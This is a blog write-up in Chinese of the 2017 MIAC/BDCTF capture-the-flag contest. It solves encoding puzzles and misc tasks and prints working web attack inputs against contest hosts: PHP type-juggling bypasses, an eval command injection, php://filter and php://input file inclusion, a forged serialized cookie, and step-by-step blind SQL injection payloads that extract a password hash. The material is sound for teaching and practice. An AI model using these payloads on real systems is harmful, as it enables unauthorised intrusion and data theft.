---
title: 2017 MIAC移动安全赛
tags: [ctf]
date: 2017-10-15 16:25:04
categories: writeup
comments: true
description: ┏ (゜ω゜)=☞  滑稽树上滑稽果 
---

## 2017/10/14

> http://miac.cug.edu.cn/
>
> http://www.yogeit.com/
>
> https://www.bdctf.online/

### Crypto

#### 贝斯的一家

> ```python
> UjFrelJFMVJXbGRIUlRORVQwNHlRMGRaTTBSTlVWcFVSMUV6UkU5T1MwZEhUVmxVUzFKU1ZVZEpXbFJKVGxwVVIxa3lWRXRTVWxkSVJWcFVSMDVMUjBkVk0wUkhUVnBZUjBrelZGTk9TMGRIVFRSVVRWSlNWMGxaTTBSSlRqSkY=
> ```

依次base64、base64、base32、base16解码。
`flag{fl4g_1_B4se_i3_V3ry_9ood}`

#### 颜文字

> ```aaencode
>  ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ][ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
> ```

aaencode ，[在线解混淆](https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html) 或在 chrome 的console里直接运行即可。其他还有jjencode,ppencode,rrencode等。

```
alert("flag{aaencode_f14g_h4h4h4}")
```

#### 你猜我像啥

> ```python
> Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4=
> ```


```python
from base64 import *
s='Li0tLS0gLi4tLS0gLi4uLi4gLS4uLi4tIC4uLi4uIC4tLS0tIC0uLi4uLSAtLS0tLiAuLi4uLiAt\nLi4uLi0gLi0tLS0gLS0tLS0gLi0tLS0gLS4uLi4tIC0tLS0uIC4uLi4uIC0uLi4uLSAuLi4uLSAt\nLS0uLiAtLi4uLi0gLS0tLS4gLi4uLi4gLS4uLi4tIC4tLS0tIC0tLS0tIC4tLS0tIC0uLi4uLSAu\nLS0tLSAuLS0tLSAtLS4uLiAtLi4uLi0gLi0tLS0gLi0tLS0gLS4uLi4gLS4uLi4tIC4tLS0tIC4u\nLS0tIC4tLS0tIC0uLi4uLSAuLS0tLSAtLS0tLSAtLS0uLiAtLi4uLi0gLi0tLS0gLi4tLS0gLS0t\nLS0gLS4uLi4tIC4tLS0tIC4tLS0tIC4uLi4tIC0uLi4uLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4u\nLi0gLi0tLS0gLS0tLS0gLi4uLi0gLS4uLi4tIC4tLS0tIC0tLS0tIC0tLS4uIC0uLi4uLSAuLi4u\nLiAuLS0tLSAtLi4uLi0gLi4uLi4gLi0tLS0gLS4uLi4tIC4tLS0tIC4uLS0tIC4uLi0tIC0uLi4u\nLSAuLS0tLSAuLS0tLSAtLS0tLSAtLi4uLi0gLi0tLS0gLi0tLS0gLi4uLi4='
b64decode(s.replace('\n',''))  
#'.---- ..--- ..... -....- ..... .---- -....- ----. ..... -....- .---- ----- .---- -....- ----. ..... -....- ....- ---.. -....- ----. ..... -....- .---- ----- .---- -....- .---- .---- --... -....- .---- .---- -.... -....- .---- ..--- .---- -....- .---- ----- ---.. -....- .---- ..--- ----- -....- .---- .---- ....- -....- .---- .---- ----- -....- .---- ----- ....- -....- .---- ----- ---.. -....- ..... .---- -....- ..... .---- -....- .---- ..--- ...-- -....- .---- .---- ----- -....- .---- .---- .....'
#摩斯密码的解密(https://morsecode.scphillips.com/translator.html)
#=>125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115
#ASCII码转字符	}3_e_0_eutylxrnhl33{ns
t='125-51-95-101-95-48-95-101-117-116-121-108-120-114-110-104-108-51-51-123-110-115'
tt=''.join(map(lambda x:chr(int(x)),t.split('-')))
#字符串反转  	sn{33lhnrxlytue_0_e_3}
rtt=tt[::-1]
#栅栏密码的解密	synt{u3e3_l0h_ner_x3l}
#凯撒密码解密 	flag{h3r3_y0u_are_k3y}
```



---

## 2017/10/23

### WEB

#### WEB签到

> 签到，格式bdctf{xxxxx}
> http://2a8a372c90b9c52b54ac9f85234f6f20.yogeit.com:8080

```php
 <?php
highlight_file('flag.php');
$_GET['id'] = urldecode($_GET['id']);
$flag = 'bdctf{xxxxxxxxxxxxxxxxxx}';
if (isset($_GET['user']) and isset($_POST['pass'])) {
    if ($_GET['user'] == $_POST['pass'])
        print 'pass can not be user.';
    else if (sha1($_GET['user']) === sha1($_POST['pass'])&($_GET['id']=='margin'))
        die('Flag: '.$flag);
    else
        print 'sorry!';
}
?> 
```

对数组进行哈希会返回null，所以传进去两个数组即可。`Flag: bdctf{welcomeBDCTF2017}`

![](web-checkin.png)

#### 命令注入

> 格式是flag{xxxx}
> http://c3f534c3e77ef68bda72e406337023fb.yogeit.com:8080

```php
<?php 
include "flag.php";
error_reporting(0);
show_source(__FILE__);
$a = @$_REQUEST['hello'];
eval("var_dump($a);");
```

直接执行系统命令，`system('cat flag.php')` 。得到flag为`flag{93odcGA47rSRFDG}` 

![](cmd-inject.png)

#### 这不仅仅是WEB

> 格式bdctf{xxxxx}
> http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080

存在文件读取：

```php
//index.php
//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=index.php
<?php
$file = $_GET["page"];
if( isset( $file ) )
	include( $file );
else {
	header( 'Location:?page=include.php' );
	exit;
}
?>
```

```php
//include.php
//view-source:http://64fcfc546e0fafb5b4c327cc1eb36ec4.yogeit.com:8080/?page=php://filter/convert.base64-encode/resource=include.php
<?php
echo'
<html>
<body>
<p align="center">
<font size="20">
<b>File Include</b>
</font>
</p>
<br>
<p align="center"><img src="photo.jpg"></p>
<br>
<br>
<br>
<font color="white">文件格式为文本格式</font>
</body>
</html>'
?>
```

访问不了惹。

### MISC

#### MISC签到题

> `R1kzRE1RWldHRTNET04yQ0dZWkRHTVpXR0kzRElNWldHTVlUR01CVEdJWlRHTlJVR01ZVEdNUlRIRTNETU1aWkdZMlRHTVpUSEUzREVNWlVHWVlUR01SVEdZM0RFTVpaR000RE1NWlRHQTNETU1aVEdNM0RHTlJYSVE9PT09PT0=`

先base64解码，再base32解码，然后十六进制转ASCII码，得到flag为`flag{b3bd61023d129f9e39b4a26b98c0f366}`

![](misc-checkin.png)

#### 常规杂项

在文件末尾发现提示`Password:Bluedon[0-9]{8}`  ，写python脚本生成字典，`binwalk -e` 提取出压缩包，使用ziperello爆破得到密码为Bluedon47632601，解压后还是一个压缩包，但应该是伪加密，用notepad++打开即可看到flag为`flag{Aha!_Y0u_9Ot_i7}`。

队友使用了ARCHPR掩码爆破，方便很多。

```python
import itertools
s0 = 'Bluedon'
p = '0123456789'
f = open('normalpass.txt', 'w+')
passwd = ''
for i in itertools.product(p, p, p, p, p, p, p, p):
    passwd = s0 + ''.join(i)
    f.write(passwd)
```

![](cracked.png)

![](normal-misc-flag.png)

#### 就在眼前

> 就在眼前
> 恩，如题。格式BDCTF{xxxxx}
>
> `flag=E5=80=BC=E5=B0=B1=E5=9C=A8=E6=AD=A4=E6=96=87=E6=A1=A3=E4=B8=AD=EF=BC=8C=E5=B9=B6=E4=B8=94=E4=BD=BF=E7=94=A8=E4=BA=86=E6=96=87=E6=9C=AC=E9=9A=90=E8=97=8F=E6=8A=8A=E8=87=AA=E5=B7=B1=E9=9A=90=E8=97=8F=E8=B5=B7=E6=9D=A5=E4=BA=86=E3=80=82=0A=E6=98=BE=E7=A4=BA=E5=87=BA=E9=9A=90=E8=97=8F=E6=96=87=E6=9C=AC=E5=8D=B3=E5=8F=AF`

使用了Quoted Printable encode，[在线解码](http://www.webatic.com/run/convert/qp.php) 可知隐藏了flag，让其显示即可。`BDCTF{Y0u_4Re_5ucCe5SFul}`

队友将文件另存为XML，打开也可见flag。

![](qpdecode.png)![](jiuzaiyanqian-flag.png)

---

## 2017/10/30

### web

#### 签到题

> 更大的数，格式bdctf{xxx}
> http://1ccb637956167fe75634730d3d5e9d71.yogeit.com:8080

修改表单长度限制。`bdctf{s0m2thing_ju8t_1ik2_thi8}`

#### 简单的题

> 格式flag{xxxx}
> http://f944ecfceaddb11ec591f23738496e52.yogeit.com:8080

```php
if(isset($_POST['password'])) {
    if (strcmp($_POST['password'], $flag) == 0)
        die($flag);
    else
        echo "密码不正确！";
}
```

post一个数组 `password[]=` 即可。`flag{Y0u_4re_G3t_FLAG_452}`

#### WEB100-2

> 提示是?hint，格式是flag{xxxx}
> http://78a06773a04246464d8eeadd2cdf28af.yogeit.com:8080

根据提示访问http://127.0.0.1/ctfoj/bdctf.php?hint 得到源码。
带上`Cookie: BDCTF=s:21:"BDCTF:www.bluedon.com"%3b ` 即可得到`flag{pBXeeZdOkG1QTP1}` 。cookie中的分号要url编码一下。

```php
<?php  
error_reporting(0);  
$KEY='BDCTF:www.bluedon.com';  
include_once("flag.php");  

$cookie = $_COOKIE['BDCTF'];  

if(isset($_GET['hint'])){  
    show_source(__FILE__);  
}  
elseif (unserialize($cookie) === "$KEY")  
{     
    echo "$flag";  
}  
else {  foo
```

#### 蓝盾管理员

> you are not bd-admin，格式bdctf{xxx}
> http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080

访问`view-source:http://2a8da10821f39ea335a12fba77f7c3fc.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=flag.php&user=php://input` 同时post `the user is bdadmin` 得到`bd-admin!<br>PD9waHAgIA0KLy9iZGN0ZntMZmlfQW5EX01vcmV9ICANCj8+ ` ，解码后得到`bdctf{Lfi_AnD_More} `

```php
//index.php
<!--  
@$user = $_GET["user"];  
@$file = $_GET["file"];  
  
if(isset($user)&&(file_get_contents($user,'r')==="the user is bdadmin")){  
    echo "hello bd-admin!<br>";  
	include($file); //flag.php  
}else{  
    echo "you are not bd-admin ! ";  
}  
 -->  
```

#### 送大礼

> 格式bdctf{xxx}
> http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080

访问 `http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/flag.txt`  有jsfuck，[解开](http://codertab.com/jsunfuck) 后内容如下：

```php
extract($_GET);  
if(isset($bdctf))  
{      
  $content=trim(file_get_contents($flag));
  if($bdctf==$content)
  {
    echo'bdctf{**********}';
  }    else
  { 
    echo'这不是蓝盾的密码啊';
  } 
}
```

访问 `http://04c432a12784d2fb5ef431ec3366bc9a.yogeit.com:8080/?bdctf=foo&flag=php://input` 同时post `foo` 得到`bdctf{UCCdlsZyVe} ` 。

#### 火星撞地球

> flag{1q2w3e4r}
> 密码就是答案，格式flag{xxxx}
> http://eef6f0186546043da56bf4c7f7e6d3ca.yogeit.com:8080

获取当前数据库名member

```
name=admin%27%20and%20(ASCII(MID((database()),6,1)))=114%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
```

当前数据库只有一个表

```
name=admin%27%20and%20(ASCII(MID((select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),1,1)))=49%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
```

当前表名为member

```
name=admin%27%20and%20(ASCII(MID((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),7,1)))>0%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
```

当前表有四条记录

```
name=admin%27%20and%20(ASCII(MID((select%20count(*)%20from%20member),1,1)))=52%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
```

得到列名'id,member_user,member_password,member_name，。。。'

```
name=admin%27%20and%20(ASCII(MID((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema='member'),44,1)))>44%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
```

查询密码字段 burp爆破得到'5416d7cd6ef195a0f7622a9c56b55e84'，即'1q2w3e4r'。

```
name=admin%27%20and%20(ASCII(MID((select%20member_password%20from%20member%20where%20member_user='admin'),1,1)))=53%23&password=%27%20or%201&submit2=%E4%BC%9A%E5%91%98%E7%99%BB%E5%BD%95
```

最后flag为`flag{1q2w3e4r}` 

#### 密室杀人案[x]

> 格式bdctf{xxxx}
> http://417c9d88ead6809efb1d310fe6832f56.yogeit.com:8080

```html
bdctf--密室谋杀案
这是一场发生在PHP序列化密室里面的谋杀案，今日这里发生了一起密室谋杀案，有一个名叫flag的人被杀害。案发现场发生在这个家里面，然而flag他的尸体被嫌疑人藏匿了起来,无法获得更多被害人的信息。 作案的嫌疑人在这个屋子里面，在这屋子里面的人有三兄弟和一个侦探 ，三兄弟中老大Ford权威最高，其他兄弟都在它的保护下生活,因为三兄弟的勤劳勇敢也经常被其他人调去工作任劳任怨。二哥Walker性格生性好动，喜欢结交朋友也经常找老三帮忙。 老三David为人老实憨厚，和二哥关系最好却有一天因为某件事情离开了这个家,成立了另外一个家。还有就是侦探，侦探wesley他案发当天也在现场，他似乎知道些什么但似乎迫于某种压力没有说出凶手是谁。 只要你收集足够多三兄弟的信息给wesley，相信他会说出真相。
```

#### bluedon用户[x]

> 格式，bdctf{xxxxx}
> http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080

```php
//index.php
you are not bluedon ! 
<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="the user is bluedon")){
    echo "hello bluedon!<br>";
    include($file); //class.php
}else{
    echo "you are not bluedon ! ";
}
 -->
   
//class.php
//view-source:http://11537c131de3f8b2060b36c0cf7eb083.yogeit.com:8080/?file=php://filter/convert.base64-encode/resource=class.php&user=php://input

the user is bluedon
<?php
class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "恭喜get flag";
    }
}
?>
```

